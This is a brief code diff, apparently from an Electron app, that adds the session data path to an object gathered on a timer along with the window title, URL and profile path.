@@ -26,6 +26,7 @@ const timer = setInterval(async () => {
       title: window.getTitle(),
       url: window.webContents.getURL(),
       profile: app.getPath("userData"),
+      sessionData: app.getPath("sessionData"),
       data,
       body,
     };
